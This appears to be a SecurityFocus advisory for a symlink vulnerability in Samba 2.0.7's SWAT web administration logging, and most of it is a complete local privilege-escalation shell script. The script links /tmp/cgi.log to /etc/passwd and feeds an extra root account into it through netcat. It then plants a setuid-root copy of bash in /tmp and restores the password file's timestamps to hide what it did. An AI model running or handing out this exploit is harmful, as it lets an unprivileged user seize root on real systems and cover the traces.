source: http://www.securityfocus.com/bid/1872/info
 
The Samba software suite is a collection of programs that implements the SMB protocol for unix systems, allowing you to serve files and printers to Windows, NT, OS/2 and DOS clients. This protocol is sometimes also referred to as the LanManager or Netbios protocol. Samba ships with a utility titled SWAT (Samba Web Administration Tool) which is used for remote administration of the Samba server and is by default set to run from inetd as root on port 701. Certain versions of this software ship with a vulnerability local users can use to leverage root access.
 
This problem in particular is a symlink problem where user can take advantage of poor programming in SWAT's logging facilities (which are not enabled by default) to overwrite files with user specified data. In this case, the logging is enabled under SWAT it logs by default to:
 
/tmp/cgi.log
 
This file logs all traffic to the web service, regrettably this file does not have restrictive permissions set on it and local users may symlink
the file to any other file (which they have read access to) on the system. They can then connect to the port in question (701 by default) and have the data they type in entered into a file of their choice, typically /etc/passwd .


#!/bin/sh
# swat for samba 2.0.7 compiled with cgi logging exploit
# discovered by miah <miah@uberhax0r.net>
# exploit by optyx <optyx@uberhax0r.net>
if [ -f /tmp/cgi.log ]; then
if [ `rm -f /tmp/cgi.log` ]; then
echo "/tmp/cgi.log exists and cannot be deleted"
exit
fi
fi
echo "backing up /etc/passwd"
cp -pd /etc/passwd /tmp/.bak
touch -r /etc/passwd /tmp/.bak
ln -s /etc/passwd /tmp/cgi.log
echo "connecting to swat"
echo -e "uberhaxr::0:0:optyx r0x y3r b0x:/:/bin/bash\n"| nc -w 1 localhost swat
if [ `su -l uberhaxr -c "cp /bin/bash /tmp/.swat"` ]; then
echo "exploit failed"
rm /tmp/.bak
rm /tmp/cgi.log
exit
fi
su -l uberhaxr -c "chmod u+s /tmp/.swat"
echo "restoring /etc/passwd"
su -l uberhaxr -c "cp -pd /tmp/.bak /etc/passwd; \
chown root.root /etc/passwd; \
touch -r /tmp/.bak /etc/passwd"
rm /tmp/.bak
rm /tmp/cgi.log
echo "got root? (might want to rm /tmp/.swat)"
/tmp/.swat